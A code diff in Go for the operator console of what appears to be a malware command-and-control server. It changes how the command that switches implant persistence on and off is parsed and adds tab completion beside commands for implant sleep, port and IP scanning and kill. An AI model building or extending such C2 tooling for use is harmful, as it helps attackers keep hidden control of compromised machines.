@@ -128,20 +128,19 @@ func (c2 *c2) handle_user_input(text string) {
 
 		log.Println("Implant sleeping...")
 		c2.queue <- messages.C2_sleep(int64(seconds))
-	case "persistence":
+	case "persist":
 		if len(parts) != 2 {
 			incorrect_usage()
 			return
 		}
 
-		b, err := strconv.ParseBool(parts[1])
-		if err != nil {
-			fmt.Println("Not a valid bool: " + parts[1])
+		if parts[1] != "on" && parts[1] != "off" {
+			fmt.Println("Not a valid option: Use on/off")
 			return
 		}
 
-		log.Println(sprintf("Setting persistence to %t", b))
-		c2.queue <- messages.C2_persistence(b)
+		log.Println("Setting persistence to", parts[1])
+		c2.queue <- messages.C2_persistence(parts[1] == "on")
 	case "help":
 		help()
 	default:
@@ -202,6 +201,7 @@ var completer = readline.NewPrefixCompleter( // Tab completer
 	readline.PcItem("portscan", readline.PcItem("cancel")),
 	readline.PcItem("ipscan", readline.PcItem("cancel")),
 	readline.PcItem("kill"),
+	readline.PcItem("persist", readline.PcItem("on"), readline.PcItem("off")),
 	readline.PcItem("list"),
 	readline.PcItem("sleep"),
 	readline.PcItem("help"),
